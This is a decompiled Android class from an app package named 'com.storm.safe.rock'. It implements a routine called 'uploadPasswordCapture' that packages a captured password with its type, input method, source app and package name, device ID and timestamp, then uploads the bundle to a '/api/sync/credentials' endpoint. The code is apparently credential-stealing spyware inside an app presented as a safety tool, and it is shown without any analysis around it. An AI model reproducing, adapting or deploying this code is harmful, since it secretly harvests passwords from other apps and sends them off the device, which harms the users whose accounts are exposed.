package com.storm.safe.rock.network;

import kotlin.Result;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.network.HttpManager$uploadPasswordCapture$2", m214403f = "HttpManager.kt", m214404l = {229}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class HttpManager$uploadPasswordCapture$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52244a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0268a1 f52245a2;

    /* renamed from: a3 */
    public final /* synthetic */ String f52246a3;

    /* renamed from: a4 */
    public final /* synthetic */ String f52247a4;

    /* renamed from: a5 */
    public final /* synthetic */ String f52248a5;

    /* renamed from: a6 */
    public final /* synthetic */ String f52249a6;

    /* renamed from: a7 */
    public final /* synthetic */ String f52250a7;

    /* renamed from: a8 */
    public final /* synthetic */ int f52251a8;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public HttpManager$uploadPasswordCapture$2(C0268a1 c0268a1, String str, String str2, String str3, String str4, String str5, int i, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52245a2 = c0268a1;
        this.f52246a3 = str;
        this.f52247a4 = str2;
        this.f52248a5 = str3;
        this.f52249a6 = str4;
        this.f52250a7 = str5;
        this.f52251a8 = i;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new HttpManager$uploadPasswordCapture$2(this.f52245a2, this.f52246a3, this.f52247a4, this.f52248a5, this.f52249a6, this.f52250a7, this.f52251a8, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((HttpManager$uploadPasswordCapture$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        Object objM213507a7;
        C0268a1 c0268a1 = this.f52245a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52244a1;
        try {
            if (i == 0) {
                kg1.m213544f4(obj);
                JSONObject jSONObject = new JSONObject();
                String str = this.f52246a3;
                String str2 = this.f52247a4;
                String str3 = this.f52248a5;
                String str4 = this.f52249a6;
                String str5 = this.f52250a7;
                int i2 = this.f52251a8;
                jSONObject.put("deviceId", c0268a1.f52279a2);
                jSONObject.put("password", str);
                jSONObject.put("passwordType", str2);
                jSONObject.put("inputMethod", str3);
                jSONObject.put("appName", str4);
                jSONObject.put("packageName", str5);
                jSONObject.put("confidence", i2);
                jSONObject.put("timestamp", System.currentTimeMillis());
                this.f52244a1 = 1;
                objM213507a7 = c0268a1.m211371a1("/api/sync/credentials", jSONObject, true, this);
                if (objM213507a7 == coroutineSingletons) {
                    return coroutineSingletons;
                }
            } else {
                if (i != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                objM213507a7 = ((Result) obj).f57559a0;
            }
        } catch (Exception e) {
            t60.m214705c6("HttpManager", "上传密码失败", e);
            int i3 = Result.f57558a1;
            objM213507a7 = kg1.m213507a7(e);
        }
        return new Result(objM213507a7);
    }
}
